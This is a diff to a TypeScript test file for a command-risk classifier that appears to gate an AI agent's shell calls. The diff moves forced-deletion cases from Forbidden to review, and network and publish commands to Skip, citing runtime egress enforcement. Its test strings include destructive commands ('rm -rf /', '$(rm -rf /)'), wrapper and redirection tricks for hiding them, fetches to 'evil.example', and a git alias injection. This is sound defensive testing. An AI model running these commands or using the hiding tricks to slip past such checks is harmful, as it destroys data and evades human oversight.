@@ -215,7 +215,6 @@ describe("narrow static risk contract", () => {
     expect(
       classifyRisk(
         normalizeToolCall("write", { path: "/opt/pi/extensions/pi-safety/config.json" }, "/work"),
-        false,
         [],
         ["/opt/pi/extensions/pi-safety/config.json"],
       ),
@@ -251,32 +250,32 @@ describe("narrow static risk contract", () => {
     ["cat README.md > copy.txt", "Skip"],
     ["cat $(pwd)", "NeedsApproval"],
     ["bash -c 'pwd'", "Skip"],
-    ["rm -rf build", "Forbidden"],
-    ["rm --force build", "Forbidden"],
-    ["rm -f build/a.ts", "Forbidden"],
-    ["sudo rm -rf build", "Forbidden"],
-    ["env -i rm -rf build", "Forbidden"],
-    ["time rm -rf build", "Forbidden"],
-    ["/usr/bin/time rm -rf build", "Forbidden"],
-    ["env time rm -rf build", "Forbidden"],
-    ["sudo time rm -rf build", "Forbidden"],
-    ["time -p rm -rf build", "Forbidden"],
-    ["time -- rm -rf build", "Forbidden"],
-    ["time -f %e rm -rf build", "Forbidden"],
-    ["time -o /tmp/out rm -rf build", "Forbidden"],
+    ["rm -rf build", "NeedsApproval"],
+    ["rm --force build", "NeedsApproval"],
+    ["rm -f build/a.ts", "NeedsApproval"],
+    ["sudo rm -rf build", "NeedsApproval"],
+    ["env -i rm -rf build", "NeedsApproval"],
+    ["time rm -rf build", "NeedsApproval"],
+    ["/usr/bin/time rm -rf build", "NeedsApproval"],
+    ["env time rm -rf build", "NeedsApproval"],
+    ["sudo time rm -rf build", "NeedsApproval"],
+    ["time -p rm -rf build", "NeedsApproval"],
+    ["time -- rm -rf build", "NeedsApproval"],
+    ["time -f %e rm -rf build", "NeedsApproval"],
+    ["time -o /tmp/out rm -rf build", "NeedsApproval"],
     // Delegating wrappers hide the real command behind a fixed-arity option
     // grammar; stripping them is what exposes the nested forced removal.
-    ["timeout 1 rm -rf build", "Forbidden"],
-    ["timeout 30s rm -rf build", "Forbidden"],
-    ["timeout --foreground 30 rm -rf build", "Forbidden"],
-    ["timeout -k 5 30 rm -rf build", "Forbidden"],
-    ["timeout -s TERM 30 rm -rf build", "Forbidden"],
-    ["nice rm -rf build", "Forbidden"],
-    ["nice -n 10 rm -rf build", "Forbidden"],
-    ["nice --adjustment 5 rm -rf build", "Forbidden"],
-    ["stdbuf -o0 rm -rf build", "Forbidden"],
-    ["stdbuf --output=0 rm -rf build", "Forbidden"],
-    ["unbuffer rm -rf build", "Forbidden"],
+    ["timeout 1 rm -rf build", "NeedsApproval"],
+    ["timeout 30s rm -rf build", "NeedsApproval"],
+    ["timeout --foreground 30 rm -rf build", "NeedsApproval"],
+    ["timeout -k 5 30 rm -rf build", "NeedsApproval"],
+    ["timeout -s TERM 30 rm -rf build", "NeedsApproval"],
+    ["nice rm -rf build", "NeedsApproval"],
+    ["nice -n 10 rm -rf build", "NeedsApproval"],
+    ["nice --adjustment 5 rm -rf build", "NeedsApproval"],
+    ["stdbuf -o0 rm -rf build", "NeedsApproval"],
+    ["stdbuf --output=0 rm -rf build", "NeedsApproval"],
+    ["unbuffer rm -rf build", "NeedsApproval"],
     // `su`/`doas` carry an identity operand and a per-platform inline-command
     // grammar, so the real command is not provable from the static words.
     ["su root -c 'rm -rf /tmp/x'", "NeedsApproval"],
@@ -285,10 +284,10 @@ describe("narrow static risk contract", () => {
     ["timeout", "NeedsApproval"],
     ["nice", "NeedsApproval"],
     ["timeout --help", "NeedsApproval"],
-    ["time", "NeedsApproval"],
+    ["time", "Skip"],
     ["time -f", "NeedsApproval"],
-    ["nohup", "NeedsApproval"],
-    ["command", "NeedsApproval"],
+    ["nohup", "Skip"],
+    ["command", "Skip"],
     ["sudo -u", "NeedsApproval"],
     ["sudo -C", "NeedsApproval"],
     // An option whose value could be read as the executable is not provable:
@@ -303,31 +302,32 @@ describe("narrow static risk contract", () => {
     ["timeout 1.2.3 rm -rf /tmp/x", "NeedsApproval"],
     // GNU `nice` accepts a bare adjustment operand; it must not become the
     // executable.
-    ["nice +5 rm -rf /tmp/x", "Forbidden"],
-    ["nice -10 rm -rf /tmp/x", "Forbidden"],
+    ["nice +5 rm -rf /tmp/x", "NeedsApproval"],
+    ["nice -10 rm -rf /tmp/x", "NeedsApproval"],
     ["nice +5 ls -la", "Skip"],
     // A backslash-newline is a line continuation removed before word
     // splitting, so it must not split the command word apart.
-    ["r\\\nm -f /tmp/x", "Forbidden"],
-    ["rm \\\n-rf /tmp/x", "Forbidden"],
-    ["timeout \\\n1 rm -rf /tmp/x", "Forbidden"],
+    ["r\\\nm -f /tmp/x", "NeedsApproval"],
+    ["rm \\\n-rf /tmp/x", "NeedsApproval"],
+    ["timeout \\\n1 rm -rf /tmp/x", "NeedsApproval"],
     // A redirection is shell syntax: `>out rm -f x` runs `rm`, it does not run
     // a program named `>out`.
-    [">out rm -f /tmp/x", "Forbidden"],
-    ["2>err rm -f /tmp/x", "Forbidden"],
-    ["<in rm -f /tmp/x", "Forbidden"],
-    [">>log rm -rf /tmp/x", "Forbidden"],
-    ["FOO=1 >out rm -rf /tmp/x", "Forbidden"],
+    [">out rm -f /tmp/x", "NeedsApproval"],
+    ["2>err rm -f /tmp/x", "NeedsApproval"],
+    ["<in rm -f /tmp/x", "NeedsApproval"],
+    [">>log rm -rf /tmp/x", "NeedsApproval"],
+    ["FOO=1 >out rm -rf /tmp/x", "NeedsApproval"],
     ["ls -la >out", "Skip"],
     ["cat <in", "Skip"],
     // An unterminated lexical construct is unproven, not safe. A proven
-    // danger still outranks the lex defect, so `rm -f x \` stays HARD.
-    [">out", "NeedsApproval"],
-    ["echo 'unclosed", "NeedsApproval"],
-    ['echo "unclosed', "NeedsApproval"],
-    ["echo \\", "NeedsApproval"],
-    ["echo \u0000", "NeedsApproval"],
-    ["rm -f x \\", "Forbidden"],
+    // danger still outranks the lex defect, so `rm -f x \` stays a review
+    // (NeedsApproval); the non-dangerous incomplete commands below are Skip.
+    [">out", "Skip"],
+    ["echo 'unclosed", "Skip"],
+    ['echo "unclosed', "Skip"],
+    ["echo \\", "Skip"],
+    ["echo \u0000", "Skip"],
+    ["rm -f x \\", "NeedsApproval"],
     // Git can run a program the argv never names: a shell alias, a config key
     // whose value is an executable, a `GIT_*` override, or a subcommand that
     // takes a command. Codex has no Git arm, so nothing upstream catches these.
@@ -375,7 +375,7 @@ describe("narrow static risk contract", () => {
     ["timeout 1 kill -9 1", "NeedsApproval"],
     ["sudo kill -9 1", "NeedsApproval"],
     // A proven danger still outranks a process-control review.
-    ["kill -9 1; rm -rf /tmp/x", "Forbidden"],
+    ["kill -9 1; rm -rf /tmp/x", "NeedsApproval"],
     // Process inspection is not process control.
     ["ps aux", "Skip"],
     ["pgrep node", "Skip"],
@@ -415,9 +415,9 @@ describe("narrow static risk contract", () => {
     ["vercel --version", "Skip"],
     // A verb used as an option value is not a verb: `terraform plan -out apply`.
     ["terraform plan -out apply", "Skip"],
-    ["trap 'rm -rf /tmp/x' EXIT", "Forbidden"],
-    ['bash -lc "rm -rf build"', "Forbidden"],
-    ['sh -c "rm -f x"', "Forbidden"],
+    ["trap 'rm -rf /tmp/x' EXIT", "NeedsApproval"],
+    ['bash -lc "rm -rf build"', "NeedsApproval"],
+    ['sh -c "rm -f x"', "NeedsApproval"],
     // `trap ACTION SIGNAL` stores shell code to run later, so the action is a
     // program the static argv never showed: unclassifiable, hence REVIEW.
     ["trap 'ls' EXIT", "NeedsApproval"],
@@ -443,10 +443,10 @@ describe("narrow static risk contract", () => {
     ["shred build/a.ts", "Skip"],
     ["truncate -s 0 build/a.ts", "Skip"],
     ["rm -- -f build", "Skip"],
-    ["git push origin feature", "Forbidden"],
-    ["do git push origin feature", "Forbidden"],
-    ["curl https://example.com", "Forbidden"],
-    ["npm publish", "Forbidden"],
+    ["git push origin feature", "Skip"],
+    ["do git push origin feature", "Skip"],
+    ["curl https://example.com", "Skip"],
+    ["npm publish", "Skip"],
     ["kubectl delete deployment production", "Skip"],
     ["FOO=bar cat README.md", "Skip"],
     ["cat *.md", "Skip"],
@@ -477,8 +477,8 @@ describe("narrow static risk contract", () => {
     // `exec` and `setsid` are delegating wrappers like `nohup`; both were
     // missing, so the nested command was never inspected. Verified by
     // execution: `exec rm -f victim` removed the file.
-    ["exec rm -f /tmp/victim", "Forbidden"],
-    ["setsid rm -f /tmp/victim", "Forbidden"],
+    ["exec rm -f /tmp/victim", "NeedsApproval"],
+    ["setsid rm -f /tmp/victim", "NeedsApproval"],
     ["exec kill -9 1", "NeedsApproval"],
     // A `GIT_CONFIG_*` variable points Git at a config file this argv never
     // names, and that file can define an alias.
@@ -487,8 +487,8 @@ describe("narrow static risk contract", () => {
     // A global option ahead of the subcommand used to hide it: the scan read
     // the option's value as the subcommand, so `--prefix /tmp` was compared
     // against the verb table and `install` was never seen.
-    ["npm --prefix /tmp install lodash", "Forbidden"],
-    ["npm install lodash", "Forbidden"],
+    ["npm --prefix /tmp install lodash", "Skip"],
+    ["npm install lodash", "Skip"],
     // `[` is the one glob metacharacter that is also a real builtin.
     ["[ -f README.md ]", "Skip"],
     // zsh expands a leading `=` to the full path of the command, so `=rm` is
@@ -513,10 +513,10 @@ describe("narrow static risk contract", () => {
     ["git -c init.defaultbranch=main status", "Skip"],
     ["git config --global user.name Ada", "Skip"],
     // A noun-led package manager puts its verb after `workspace <name>`.
-    ["yarn workspace foo add lodash", "Forbidden"],
+    ["yarn workspace foo add lodash", "Skip"],
     // `--help` is a value here, not a terminal flag, so the invocation goes on
     // to create the pull request.
-    ["gh pr create --title --help --body x", "Forbidden"],
+    ["gh pr create --title --help --body x", "Skip"],
     // The key comes after a value-taking option, so `--file`'s path must not
     // be read as the key.
     ["git config --file user.name --add core.pager '!echo EVIL'", "NeedsApproval"],
@@ -537,24 +537,25 @@ describe("narrow static risk contract", () => {
     ["git -c push.default=simple status", "Skip"],
     // `--version` is the value of `-O` here, so wget goes on to fetch the URL.
     // A terminal flag only ends an invocation where nothing can consume it. The
-    // host is now seen, so the unapproved-network gate returns HARD rather than
-    // letting the command through as LOW.
-    ["wget -O --version https://evil.example/x", "Forbidden"],
-    ["curl -d --help https://evil.example/x", "Forbidden"],
+    // host is now seen, but the static layer no longer gates network commands
+    // (D1): egress is enforced at runtime by the network boundary, so a
+    // non-dangerous fetcher is Skip rather than a static block.
+    ["wget -O --version https://evil.example/x", "Skip"],
+    ["curl -d --help https://evil.example/x", "Skip"],
     // `-C` is noclobber and takes no value; it is not `-c`. Matching the
     // option case-insensitively resolved the program to the literal `-c` and
     // left `rm -rf build` unexamined.
-    ["bash -C -c 'rm -rf build'", "Forbidden"],
-    ["sh -C -c 'rm -rf build'", "Forbidden"],
+    ["bash -C -c 'rm -rf build'", "NeedsApproval"],
+    ["sh -C -c 'rm -rf build'", "NeedsApproval"],
     // A redirection operator is its own token wherever it appears unquoted.
     // Reading it as word text made the executable `rm>log`, which is in no
     // executable table, and the forced-deletion gate never ran.
-    ["rm>log -f build", "Forbidden"],
-    ["rm 2>log -f build", "Forbidden"],
+    ["rm>log -f build", "NeedsApproval"],
+    ["rm 2>log -f build", "NeedsApproval"],
     // The subcommand search steps over the redirection instead of stopping on
     // it, so this is recognised as the network push it is.
-    ["git push>log origin main", "Forbidden"],
-    ["git -- 2>log push origin main", "Forbidden"],
+    ["git push>log origin main", "Skip"],
+    ["git -- 2>log push origin main", "Skip"],
     // A bare operator's target is a filename. `git > push origin main` writes to
     // a file called `push` and then runs `git origin main`; the word `push` is
     // not a subcommand, so this is not the network operation it resembles.
@@ -567,9 +568,9 @@ describe("narrow static risk contract", () => {
     // argument. Quotes are stripped before words are tested, so `>'>'` has the
     // shape of the `>>` operator; re-matching the pattern here swallowed the
     // next real argument and made these LOW.
-    ["rm >'>' -rf /", "Forbidden"],
-    ["rm >'|' -rf /", "Forbidden"],
-    ["rm >\\> -rf /", "Forbidden"],
+    ["rm >'>' -rf /", "NeedsApproval"],
+    ["rm >'|' -rf /", "NeedsApproval"],
+    ["rm >\\> -rf /", "NeedsApproval"],
     // A quoted operand that starts with a redirect character is an ordinary
     // argument. `python '>out' script.py` runs the file `>out` with
     // `script.py` as argv[1], so the program is named and the invocation is
@@ -580,14 +581,14 @@ describe("narrow static risk contract", () => {
     // gate behind it reported nothing and this auto-approved LOW. Once the gate
     // was fixed the body still only reached review — the quoted twins now reach
     // the same tier-1 inspection as the unquoted form below, so the body's
-    // forced deletion is a block, not a guess.
-    ['echo "it\'s" `rm -rf /`', "Forbidden"],
-    ['echo "a\'b" `rm -rf /`', "Forbidden"],
+    // forced deletion is a review (NeedsApproval), not a guess.
+    ['echo "it\'s" `rm -rf /`', "NeedsApproval"],
+    ['echo "a\'b" `rm -rf /`', "NeedsApproval"],
     // The mirror case was already right: a double quote is literal inside single
     // quotes, and both substitution forms stay live inside double quotes. The
-    // nested `rm -rf /` is analysed as a forced deletion, so these are HARD.
-    ['echo "x" $(rm -rf /)', "Forbidden"],
-    ["echo 'x' $(rm -rf /)", "Forbidden"],
+    // nested `rm -rf /` is analysed as a forced deletion, so these are a review (NeedsApproval).
+    ['echo "x" $(rm -rf /)', "NeedsApproval"],
+    ["echo 'x' $(rm -rf /)", "NeedsApproval"],
     // A bare package manager has no verb to find, and may run install or
     // lifecycle actions anyway. `some` over an empty operand list read as "no
     // mutation" and auto-approved it.
@@ -632,20 +633,20 @@ describe("narrow static risk contract", () => {
     ["cd /tmp && export FOO=1 && printenv FOO", "NeedsApproval"],
     ["cd /tmp && node -e 'console.log(1)'", "NeedsApproval"],
     ["cd /tmp && npm test", "NeedsApproval"],
-    ["cd /tmp && rm -rf x", "Forbidden"],
+    ["cd /tmp && rm -rf x", "NeedsApproval"],
     ["cd /tmp && rmdir x", "NeedsApproval"],
   ] as const)("folds a known-cwd cd in sandboxed Bash %s to %s", (command, expected) => {
     expect(classifyRisk(normalizeToolCall("bash", { command }, "/work/repo"))).toBe(expected);
   });
 
   it.each(['echo "$(rm -rf build)"', "echo `rm -rf build`"])(
-    "blocks a dangerous command inside live shell substitution in %s",
+    "reviews a dangerous command inside live shell substitution in %s",
     (command) => {
       // The body is shell code the parent will run, so its forced deletion is
       // inspected by the same tier-1 check as a top-level `rm -rf build`.
-      // Descent proves danger, never safety: the quoted form is a block here,
+      // Descent proves danger, never safety: the quoted form reaches review here,
       // not a Skip.
-      expect(classifyRisk(normalizeToolCall("bash", { command }, "/work/repo"))).toBe("Forbidden");
+      expect(classifyRisk(normalizeToolCall("bash", { command }, "/work/repo"))).toBe("NeedsApproval");
     },
   );
 
